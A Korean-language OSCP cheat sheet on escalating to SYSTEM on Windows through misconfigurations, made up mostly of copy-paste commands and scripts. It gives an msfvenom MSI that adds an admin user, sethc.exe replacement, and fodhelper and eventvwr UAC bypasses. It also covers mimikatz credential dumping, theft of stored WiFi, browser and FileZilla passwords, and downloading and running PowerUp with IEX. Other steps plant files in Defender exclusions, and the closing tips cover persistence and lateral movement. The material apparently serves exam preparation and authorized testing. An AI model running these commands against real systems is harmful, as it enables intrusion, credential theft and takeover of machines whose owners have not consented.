# Windows Common Misconfigurations Privilege Escalation

> **OSCP 핵심**: Windows 일반적인 설정 오류를 악용하여 즉시 SYSTEM 권한 획득하는 검증된 방법들

## ⚡ 즉시 실행할 명령어들

### 🔥 핵심 설정 오류 확인 (30초 안에)

```cmd
:: 가장 중요한 설정 오류들 즉시 확인
:: 1. AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2>nul

:: 2. 자동 로그온 자격 증명
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr "DefaultUserName\|DefaultPassword\|AltDefaultUserName\|AltDefaultPassword"

:: 3. 저장된 자격 증명
cmdkey /list
rundll32.exe keymgr.dll,KRShowKeyMgr

:: 4. UAC 설정
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | findstr "EnableLUA\|ConsentPromptBehaviorAdmin"

:: 5. 패스워드 정책
net accounts
```

### 🎯 파일 및 디렉토리 권한 (즉시)

```cmd
:: 중요 디렉토리 권한 확인
icacls "C:\Program Files" | findstr "Everyone\|Users\|Authenticated Users"
icacls "C:\Program Files (x86)" | findstr "Everyone\|Users\|Authenticated Users"
icacls "C:\Windows\System32" | findstr "Everyone\|Users\|Authenticated Users"
icacls "C:\Windows\Temp" | findstr "Everyone\|Users\|Authenticated Users"

:: 사용자 홈 디렉토리 권한
icacls C:\Users\* | findstr "Everyone\|Users"

:: IIS 디렉토리 (웹 서버 있는 경우)
icacls "C:\inetpub\wwwroot" 2>nul | findstr "Everyone\|Users"
```

### ⚡ 네트워크 및 서비스 설정

```cmd
:: 네트워크 공유 확인
net share
wmic share get name,path,description

:: 방화벽 상태
netsh firewall show config 2>nul
netsh advfirewall show allprofiles 2>nul

:: Windows Defender 상태
sc query windefend
powershell "Get-MpComputerStatus" 2>nul
```

## 📋 단계별 체크리스트

### Phase 1: 시스템 정책 및 설정 (3분)

- [ ] **AlwaysInstallElevated**: MSI 패키지 관리자 권한 설치
- [ ] **자동 로그온**: 레지스트리에 저장된 평문 패스워드
- [ ] **UAC 설정**: UAC 비활성화 또는 약한 설정
- [ ] **패스워드 정책**: 약한 패스워드 정책 설정
- [ ] **계정 잠금 정책**: 브루트포스 공격에 취약한 설정

### Phase 2: 파일 시스템 권한 (4분)

- [ ] **Program Files 권한**: 프로그램 설치 디렉토리 쓰기 권한
- [ ] **System32 권한**: 시스템 파일 디렉토리 권한 오류
- [ ] **사용자 디렉토리**: 다른 사용자 홈 디렉토리 접근 권한
- [ ] **임시 디렉토리**: Temp 디렉토리 권한 설정
- [ ] **웹 루트**: IIS 웹 루트 디렉토리 권한

### Phase 3: 서비스 및 네트워크 (3분)

- [ ] **네트워크 공유**: 익명 접근 가능한 공유
- [ ] **방화벽 설정**: 방화벽 비활성화 또는 약한 규칙
- [ ] **Windows Defender**: 안티바이러스 비활성화
- [ ] **원격 접근**: RDP, WinRM 등 원격 서비스 설정
- [ ] **데이터베이스**: SQL Server, MySQL 등 기본 설정

### Phase 4: 자격 증명 및 민감 정보 (3분)

- [ ] **저장된 자격 증명**: Windows Credential Manager
- [ ] **히스토리 파일**: PowerShell, CMD 히스토리
- [ ] **설정 파일**: 애플리케이션 설정 파일의 패스워드
- [ ] **로그 파일**: 로그에 남겨진 민감 정보
- [ ] **백업 파일**: 설정 백업 파일들

## 🎯 발견별 즉시 익스플로잇

### 🚨 AlwaysInstallElevated 악용 (즉시 SYSTEM)

```cmd
:: 1. 설정 확인 (둘 다 1이어야 함)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

:: 2. MSI 패키지 생성 (msfvenom)
msfvenom -p windows/adduser USER=hacker PASS=password123 -f msi -o adduser.msi

:: 3. MSI 설치 (자동으로 SYSTEM 권한)
msiexec /quiet /qn /i adduser.msi

:: 4. 새 계정 확인
net user hacker
net localgroup administrators
```

### 🔐 자동 로그온 자격 증명 악용

```cmd
:: 1. 자격 증명 확인
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

:: 2. 발견된 자격 증명으로 로그인
:: DefaultUserName과 DefaultPassword 값 확인
runas /user:DOMAIN\USERNAME cmd
:: 또는
runas /user:USERNAME cmd

:: 3. 관리자 계정인 경우 즉시 권한상승 완료
:: 일반 사용자인 경우 다른 privesc 기법 적용
```

```powershell
# PowerShell로 자동 로그온 정보 확인
$winlogon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
if ($winlogon.DefaultUserName) {
    Write-Host "Auto-logon User: $($winlogon.DefaultUserName)" -ForegroundColor Red
    if ($winlogon.DefaultPassword) {
        Write-Host "Auto-logon Password: $($winlogon.DefaultPassword)" -ForegroundColor Red
    }
}
```

### 💾 저장된 자격 증명 악용

```cmd
:: 1. 저장된 자격 증명 확인
cmdkey /list

:: 2. 저장된 자격 증명으로 명령 실행
runas /savecred /user:DOMAIN\ADMIN cmd

:: 3. Windows Credential Manager 확인
rundll32.exe keymgr.dll,KRShowKeyMgr

:: 4. 자격 증명 덤프 (미미카츠 등)
mimikatz.exe "sekurlsa::logonpasswords"

:: 5. DPAPI 마스터 키 접근
dir /a %APPDATA%\Microsoft\Protect\
dir /a %LOCALAPPDATA%\Microsoft\Protect\
```

```powershell
# PowerShell로 저장된 자격 증명 확인
# 1. Generic 자격 증명 확인
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]::new().RetrieveAll()

# 2. Web 자격 증명 확인
Get-ChildItem "HKCU:\SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2" -ErrorAction SilentlyContinue

# 3. 저장된 RDP 연결 정보
Get-ChildItem "HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue
```

### 🔓 약한 파일 권한 악용

```cmd
:: 1. Program Files 쓰기 권한 확인
icacls "C:\Program Files" | findstr "Everyone.*F\|Users.*F\|Everyone.*M\|Users.*M"

:: 2. 쓰기 가능한 경우 DLL 하이재킹
:: 실행 파일이 로드하는 DLL을 찾아서 악성 DLL 배치
echo Creating malicious DLL...
:: 악성 DLL 생성 후 배치

:: 3. System32 쓰기 권한 (매우 드물지만 강력)
icacls "C:\Windows\System32" | findstr "Everyone.*F\|Users.*F"

:: 4. 시스템 파일 교체 (쓰기 권한 있는 경우)
takeown /f "C:\Windows\System32\sethc.exe"
icacls "C:\Windows\System32\sethc.exe" /grant %USERNAME%:F
copy "C:\Windows\System32\cmd.exe" "C:\Windows\System32\sethc.exe"
:: 로그인 화면에서 Shift 5번으로 SYSTEM cmd 실행
```

### 🌐 네트워크 공유 설정 오류

```cmd
:: 1. 네트워크 공유 확인
net share
net view \\localhost

:: 2. 익명 접근 가능한 공유 확인
net use Z: \\localhost\ShareName
dir Z:\

:: 3. 관리자 공유 접근 시도
net use \\localhost\admin$
net use \\localhost\c$

:: 4. 공유에서 민감한 파일 검색
dir Z:\ /s | findstr "password\|config\|backup"

:: 5. 공유 권한 수정 (권한 있는 경우)
net share NewShare=C:\ /grant:everyone,full
```

### 🛡️ Windows Defender 비활성화 악용

```cmd
:: 1. Windows Defender 상태 확인
sc query windefend
powershell "Get-MpComputerStatus" 2>nul

:: 2. 비활성화된 경우 악성 파일 배치
:: 탐지 없이 백도어나 해킹 도구 사용 가능

:: 3. 제외 목록 확인 (설정된 경우)
powershell "Get-MpPreference | Select-Object ExclusionPath"

:: 4. 제외 목록에 파일 배치
copy evil.exe "C:\ExcludedPath\legitimate.exe"

:: 5. 실시간 보호 상태 확인
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring
```

### 🔧 UAC 설정 오류 악용

```cmd
:: 1. UAC 설정 확인
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

:: 2. UAC 비활성화된 경우 (EnableLUA = 0)
:: 관리자 그룹 사용자는 즉시 관리자 권한 획득

:: 3. UAC 프롬프트 없음 설정 (ConsentPromptBehaviorAdmin = 0)
:: 관리자 작업이 자동 승인됨

:: 4. UAC 우회 기법 (설정이 약한 경우)
:: fodhelper.exe 우회
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
fodhelper.exe

:: 5. eventvwr.exe 우회
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f
eventvwr.exe
```

## 🤖 자동화 도구 활용

### 🔍 WinPEAS 설정 오류 스캔

```cmd
:: WinPEAS 설정 오류 관련 정보만 추출
winPEAS.exe | findstr /i "misconfiguration\|AlwaysInstall\|autologon\|credential\|UAC"

:: 특정 섹션만 실행
winPEAS.exe systeminfo
winPEAS.exe userinfo
winPEAS.exe filesinfo
```

### 🎯 PowerUp 설정 오류 분석

```powershell
# PowerUp 다운로드 및 실행
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# 설정 오류 관련 모든 검사
Invoke-AllChecks | Where-Object {$_ -like "*Misconfiguration*" -or $_ -like "*AlwaysInstall*" -or $_ -like "*AutoLogon*"}

# 개별 설정 오류 검사
Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
Get-UnattendedInstallFile
Get-WebConfig
Get-ApplicationHost
Get-ModifiableFile
```

### 🔧 설정 오류 종합 스캔 스크립트

```cmd
:: Windows 설정 오류 종합 스캔 스크립트 (복붙용)
@echo off
echo ===== WINDOWS MISCONFIGURATION SCAN =====
echo.

echo [+] Checking AlwaysInstallElevated...
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2>nul | findstr AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2>nul | findstr AlwaysInstallElevated
echo.

echo [+] Checking AutoLogon credentials...
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr "DefaultUserName\|DefaultPassword"
echo.

echo [+] Checking stored credentials...
cmdkey /list
echo.

echo [+] Checking UAC settings...
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | findstr "EnableLUA\|ConsentPromptBehaviorAdmin"
echo.

echo [+] Checking file permissions...
icacls "C:\Program Files" | findstr "Everyone\|Users" | findstr "F\|M\|W"
icacls "C:\Program Files (x86)" | findstr "Everyone\|Users" | findstr "F\|M\|W"
echo.

echo [+] Checking network shares...
net share
echo.

echo [+] Checking Windows Defender...
sc query windefend | findstr "STATE"
echo.

echo ===== SCAN COMPLETE =====
```

```powershell
# PowerShell 설정 오류 종합 스캔 스크립트 (복붙용)
Write-Host "===== WINDOWS MISCONFIGURATION SCAN =====" -ForegroundColor Green

Write-Host "`n[+] Checking AlwaysInstallElevated..." -ForegroundColor Yellow
$HKCU = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$HKLM = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
if ($HKCU.AlwaysInstallElevated -eq 1 -and $HKLM.AlwaysInstallElevated -eq 1) {
    Write-Host "VULNERABLE: AlwaysInstallElevated enabled!" -ForegroundColor Red
}

Write-Host "`n[+] Checking AutoLogon..." -ForegroundColor Yellow
$winlogon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
if ($winlogon.DefaultUserName) {
    Write-Host "AutoLogon User: $($winlogon.DefaultUserName)" -ForegroundColor Red
    if ($winlogon.DefaultPassword) {
        Write-Host "AutoLogon Password: $($winlogon.DefaultPassword)" -ForegroundColor Red
    }
}

Write-Host "`n[+] Checking UAC settings..." -ForegroundColor Yellow
$uac = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -ErrorAction SilentlyContinue
Write-Host "EnableLUA: $($uac.EnableLUA)"
Write-Host "ConsentPromptBehaviorAdmin: $($uac.ConsentPromptBehaviorAdmin)"

Write-Host "`n[+] Checking file permissions..." -ForegroundColor Yellow
$paths = @("C:\Program Files", "C:\Program Files (x86)", "C:\Windows\System32")
foreach ($path in $paths) {
    try {
        $acl = Get-Acl $path -ErrorAction Stop
        if ($acl.AccessToString -match "Everyone.*Allow.*FullControl|Users.*Allow.*FullControl") {
            Write-Host "VULNERABLE: $path has weak permissions!" -ForegroundColor Red
        }
    } catch {}
}

Write-Host "`n[+] Checking Windows Defender..." -ForegroundColor Yellow
try {
    $defender = Get-MpComputerStatus -ErrorAction Stop
    Write-Host "Real-time Protection: $($defender.RealTimeProtectionEnabled)"
    Write-Host "Antivirus Enabled: $($defender.AntivirusEnabled)"
} catch {
    Write-Host "Windows Defender status unknown"
}

Write-Host "`n===== SCAN COMPLETE =====" -ForegroundColor Green
```

## 👀 놓치기 쉬운 것들

### 🚨 숨겨진 설정 파일들

```cmd
:: 1. Unattended 설치 파일들 (패스워드 포함 가능)
dir /b /s C:\Windows\Panther\unattend.xml 2>nul
dir /b /s C:\Windows\Panther\Unattended.xml 2>nul
dir /b /s C:\Windows\System32\sysprep\unattend.xml 2>nul
dir /b /s C:\*\Autounattend.xml 2>nul

:: 2. IIS 웹 서버 설정 파일
dir /b /s C:\inetpub\wwwroot\web.config 2>nul
dir /b /s C:\Windows\Microsoft.NET\Framework*\v*\Config\web.config 2>nul
type "C:\Windows\System32\inetsrv\config\applicationHost.config" 2>nul

:: 3. SQL Server 설정 파일
dir /b /s C:\Program*\Microsoft SQL Server\*\*.config 2>nul
type "C:\Program Files\Microsoft SQL Server\90\Tools\Binn\SqlCmd.exe.config" 2>nul

:: 4. 애플리케이션 설정 백업들
dir /b /s C:\*.config.bak 2>nul
dir /b /s C:\*.config.old 2>nul
dir /b /s C:\*backup*.config 2>nul

:: 5. PowerShell 프로필 및 히스토리
type %USERPROFILE%\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1 2>nul
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul

:: 6. 크롬 저장된 패스워드 DB
dir /b /s "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" 2>nul

:: 7. FileZilla 저장된 자격 증명
type "%APPDATA%\FileZilla\sitemanager.xml" 2>nul
type "%APPDATA%\FileZilla\recentservers.xml" 2>nul

:: 8. PuTTY 저장된 세션
reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions"

:: 9. 무선랜 프로필 (패스워드 포함)
netsh wlan show profiles
for /f "tokens=2 delims=:" %i in ('netsh wlan show profiles ^| findstr "All User Profile"') do @netsh wlan show profile name=%i key=clear
```

### 🔍 로그 파일에서 민감 정보 검색

```cmd
:: 1. Windows 이벤트 로그에서 패스워드 검색
wevtutil qe Security /q:"*[EventData[Data='password']]" /f:text 2>nul | findstr /i password

:: 2. IIS 로그 파일 검색
dir /b /s C:\inetpub\logs\LogFiles\*.log 2>nul
findstr /i "password\|pass\|pwd" "C:\inetpub\logs\LogFiles\W3SVC1\*.log" 2>nul

:: 3. SQL Server 로그
dir /b /s "C:\Program Files\Microsoft SQL Server\*\Log\*.log" 2>nul
findstr /i "password\|login\|sa" "C:\Program Files\Microsoft SQL Server\MSSQL\Log\ERRORLOG" 2>nul

:: 4. 애플리케이션 로그 디렉토리
dir /b /s C:\Logs\*.log 2>nul
dir /b /s C:\Log\*.log 2>nul
findstr /i "password\|pass\|pwd\|user" C:\Logs\*.log 2>nul

:: 5. 시스템 임시 파일들
dir /b /s %TEMP%\*.log 2>nul
dir /b /s C:\Windows\Temp\*.log 2>nul
findstr /i "password\|pass" %TEMP%\*.* 2>nul

:: 6. 설치 로그 파일들
dir /b /s C:\Windows\Logs\*.log 2>nul
findstr /i "password\|pass" "C:\Windows\Logs\DISM\dism.log" 2>nul

:: 7. 크래시 덤프 파일
dir /b /s C:\Windows\Minidump\*.dmp 2>nul
dir /b /s C:\*.dmp 2>nul

:: 8. 백업 파일들
dir /b /s C:\*backup* 2>nul | head -20
dir /b /s C:\*.bak 2>nul | head -20

:: 9. 임시 사용자 파일들
dir /b /s C:\Users\*\Desktop\*.txt 2>nul
dir /b /s C:\Users\*\Documents\*.txt 2>nul
findstr /i "password\|pass" "C:\Users\*\Desktop\*.txt" 2>nul

:: 10. Git 저장소 (코드에 하드코딩된 자격 증명)
dir /b /s C:\*.git 2>nul
```

### ⚡ 프로세스 및 메모리에서 자격 증명

```cmd
:: 1. 실행 중인 프로세스의 명령줄 인수 (패스워드 포함 가능)
wmic process get name,processid,commandline | findstr /i "password\|pass\|pwd"

:: 2. 환경 변수에서 패스워드 검색
set | findstr /i "password\|pass\|pwd\|key\|secret"

:: 3. 메모리 덤프에서 자격 증명 (도구 필요)
:: procdump, mimikatz 등 사용

:: 4. 레지스트리 전체에서 패스워드 검색
reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i password
reg query HKCU /f password /t REG_SZ /s 2>nul | findstr /i password

:: 5. 서비스 계정 패스워드 (LSA Secrets)
:: mimikatz "lsadump::secrets" 필요

:: 6. 캐시된 도메인 자격 증명
:: mimikatz "lsadump::cache" 필요

:: 7. 브라우저 저장된 패스워드
:: LaZagne, WebBrowserPassView 등 도구 사용

:: 8. WiFi 저장된 패스워드
netsh wlan show profiles
netsh wlan show profile name="WiFiName" key=clear

:: 9. RDP 저장된 자격 증명
reg query "HKCU\SOFTWARE\Microsoft\Terminal Server Client\Servers"
cmdkey /list | findstr "Target"

:: 10. 클립보드 내용 (가끔 패스워드 복사되어 있음)
powershell "Get-Clipboard" 2>nul
```

### 🔧 고급 설정 오류 및 우회 기법

```cmd
:: 1. AppLocker 정책 확인
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
powershell "Get-AppLockerPolicy -Effective" 2>nul

:: 2. 소프트웨어 제한 정책
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers"

:: 3. WSUS 설정 (업데이트 서버 조작 가능)
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"

:: 4. 그룹 정책 설정 확인
gpresult /r
gpresult /z > gp_report.txt

:: 5. 로컬 보안 정책
secedit /export /cfg security_config.txt
type security_config.txt | findstr "PasswordComplexity\|MinimumPasswordLength"

:: 6. 감사 정책 (로깅 설정)
auditpol /get /category:*

:: 7. 사용자 권한 할당 정책
whoami /priv
secedit /export /areas USER_RIGHTS /cfg user_rights.txt

:: 8. NTLM 인증 설정
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel

:: 9. SMB 서명 설정
reg query "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature

:: 10. PowerShell 실행 정책 및 로깅
powershell "Get-ExecutionPolicy -List"
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
```

### 💡 환경별 특수 설정 오류

```cmd
:: 1. 도메인 환경에서의 설정 오류
:: 도메인 컨트롤러 정보
echo %LOGONSERVER%
nslookup %USERDNSDOMAIN%

:: GPO 적용 상태
gpresult /r | findstr "Applied Group Policy Objects"

:: 도메인 신뢰 관계
nltest /domain_trusts

:: 2. 가상 환경에서의 설정 오류
:: VMware Tools 권한
sc query VmToolsService

:: Hyper-V 통합 서비스
sc query vmicheartbeat

:: 3. 클라우드 환경 메타데이터 (Azure, AWS)
:: Azure 메타데이터
powershell "Invoke-RestMethod -Headers @{'Metadata'='true'} -URI 'http://169.254.169.254/metadata/instance?api-version=2019-06-01'" 2>nul

:: AWS 메타데이터
powershell "Invoke-RestMethod -URI 'http://169.254.169.254/latest/meta-data/'" 2>nul

:: 4. 개발 환경에서의 설정 오류
:: Visual Studio 설정
dir /b /s "%USERPROFILE%\.vs\*" 2>nul

:: Git 설정
type "%USERPROFILE%\.gitconfig" 2>nul

:: Docker 설정
type "%USERPROFILE%\.docker\config.json" 2>nul

:: 5. 데이터베이스 연결 문자열
findstr /i "connectionstring\|data source\|server=\|uid=\|password=" "C:\*.config" 2>nul
findstr /i "connectionstring" "C:\inetpub\wwwroot\*.config" 2>nul
```

## 🚨 중요 참고사항

### ⏰ 시간 관리

- **처음 3분**: 핵심 설정 오류(AlwaysInstallElevated, 자동 로그온 등) 확인
- **다음 4분**: 파일 시스템 권한과 네트워크 설정 분석
- **추가 3분**: 자격 증명 및 민감 정보 검색
- **마지막 3분**: 숨겨진 설정 파일과 로그 분석

### 🎯 성공률 높은 순서

1. **AlwaysInstallElevated**: 발견시 즉시 SYSTEM 권한 (거의 확실)
2. **자동 로그온**: 평문 패스워드로 다른 계정 접근 (높은 성공률)
3. **저장된 자격 증명**: Windows Credential Manager나 cmdkey (중간 성공률)
4. **약한 파일 권한**: Program Files 쓰기 권한 (DLL 하이재킹)
5. **UAC 비활성화**: 관리자 그룹 사용자의 즉시 권한상승

### 🔥 즉시 시도할 것들

- AlwaysInstallElevated는 가장 빠른 SYSTEM 권한 획득 방법
- 자동 로그온 확인은 평문 패스워드 발견 가능성 높음
- WinPEAS 실행과 동시에 수동 확인 병행
- 설정 파일들에서 패스워드 검색은 놓치기 쉬운 부분

### 💡 팁

- Windows 설정 오류는 OSCP에서 매우 흔한 권한상승 벡터
- 여러 설정 오류가 동시에 존재할 수 있으므로 체계적 확인 필요
- 자동화 도구와 수동 검색을 병행하여 놓치는 부분 최소화
- 로그 파일과 설정 백업 파일들도 반드시 확인
- 발견된 자격 증명은 다른 시스템에서도 재사용 가능성 높음
- 성공 후 다른 설정 오류도 확인하여 지속성과 횡적 이동 준비
